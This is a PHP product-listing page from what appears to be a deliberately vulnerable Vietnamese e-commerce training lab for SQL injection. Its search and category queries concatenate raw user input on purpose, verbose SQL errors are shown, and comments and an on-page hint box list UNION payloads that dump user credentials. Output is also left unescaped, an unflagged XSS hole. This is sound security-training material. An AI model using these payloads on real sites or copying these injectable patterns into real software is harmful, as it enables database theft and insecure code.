<?php
/**
 * Trang Danh Sách Sản Phẩm
 * LỖ HỎNG: SQL Injection trong tìm kiếm
 */
require_once 'config.php';

// LỖ HỎNG: SQL Injection - Không sanitize search input
$search = $_GET['search'] ?? '';
$category = $_GET['category'] ?? '';

if ($search) {
    // VULNERABLE: Có thể inject
    // Payload: ' UNION SELECT id,name,description,price,stock,category,image,created_at FROM products WHERE '1'='1
    // Hoặc dump users: ' UNION SELECT id,username,password,email,full_name,phone,address,role,created_at FROM users WHERE '1'='1
    $query = "SELECT * FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";
} elseif ($category) {
    $query = "SELECT * FROM products WHERE category = '$category'";
} else {
    $query = "SELECT * FROM products ORDER BY created_at DESC";
}


$result = mysqli_query($conn, $query);

// Hiển verbose error để dễ debug khi học SQL injection
if (!$result) {
    echo "<div class='container'><div class='alert alert-error'>Lỗi SQL: " . mysqli_error($conn) . "</div></div>";
}
// Debug: Hiển thị query thực tế (chỉ cho học tập!)
// echo "<!-- DEBUG Query: $query -->";
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sản Phẩm - Fashion Shop</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <?php include 'includes/header.php'; ?>
    
    <div class="container">
        <h1>Sản Phẩm</h1>
        
        <!-- Form tìm kiếm -->
        <div class="search-section">
            <form method="GET" class="search-form">
                <input type="text" name="search" placeholder="Tìm kiếm sản phẩm..." 
                       value="<?php echo $search; ?>">
                <button type="submit" class="btn btn-primary">Tìm Kiếm</button>
            </form>
            
            <div class="vulnerability-hint">
                <p style="font-size: 12px; color: #666;">
                    💡 <strong>Hint SQL Injection:</strong><br>
                    <strong>⚠️ Lưu ý:</strong> Query có 2 LIKE nên dùng <code>-- -</code> thay vì <code>#</code><br><br>
                    <strong>Payload 1 - Dump users (hiển thị trên UI):</strong><br>
                    <code>%' AND 1=0 UNION SELECT id,CONCAT('👤 ',username),CONCAT('🔑 ',password),0,0,'user-data',CONCAT('📧 ',email),phone,created_at FROM users -- -</code><br>
                    <strong>Payload 2 - Bypass filter (xem tất cả):</strong><br>
                    <code>%' OR 1=1 -- -</code><br>
                    <strong>Payload 3 - Test column count:</strong><br>
                    <code>%' AND 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9 -- -</code>
                </p>
            </div>
        </div>
        
        <!-- Bộ lọc danh mục -->
        <div class="categories">
            <a href="products.php" class="category-link <?php echo !$category ? 'active' : ''; ?>">Tất cả</a>
            <a href="?category=ao-nam" class="category-link <?php echo $category == 'ao-nam' ? 'active' : ''; ?>">Áo Nam</a>
            <a href="?category=quan-nam" class="category-link <?php echo $category == 'quan-nam' ? 'active' : ''; ?>">Quần Nam</a>
            <a href="?category=ao-nu" class="category-link <?php echo $category == 'ao-nu' ? 'active' : ''; ?>">Áo Nữ</a>
            <a href="?category=quan-nu" class="category-link <?php echo $category == 'quan-nu' ? 'active' : ''; ?>">Quần Nữ</a>
            <a href="?category=vay-nu" class="category-link <?php echo $category == 'vay-nu' ? 'active' : ''; ?>">Váy/Đầm</a>
        </div>
        
        <!-- Danh sách sản phẩm -->
        <div class="products-grid">
            <?php if ($result && mysqli_num_rows($result) > 0): ?>
                <?php while ($product = mysqli_fetch_assoc($result)): ?>
                    <div class="product-card">
                        <div class="product-image">
                            <img src="assets/images/<?php echo $product['image'] ?? 'placeholder.jpg'; ?>" 
                                 alt="<?php echo $product['name']; ?>">
                        </div>
                        <div class="product-info">
                            <h3><?php echo $product['name']; ?></h3>
                            <?php if (!empty($product['description'])): ?>
                                <p style="color: #666; font-size: 0.9rem; margin: 0.5rem 0;"><?php echo $product['description']; ?></p>
                            <?php endif; ?>
                            <p class="product-price"><?php echo number_format($product['price']); ?>đ</p>
                            <p class="product-stock">Còn: <?php echo $product['stock']; ?> sản phẩm</p>
                            <a href="product_detail.php?id=<?php echo $product['id']; ?>" 
                               class="btn btn-primary">Xem Chi Tiết</a>
                        </div>
                    </div>
                <?php endwhile; ?>
            <?php else: ?>
                <p>Không tìm thấy sản phẩm nào.</p>
            <?php endif; ?>
        </div>
    </div>
    
    <?php include 'includes/footer.php'; ?>
</body>
</html>
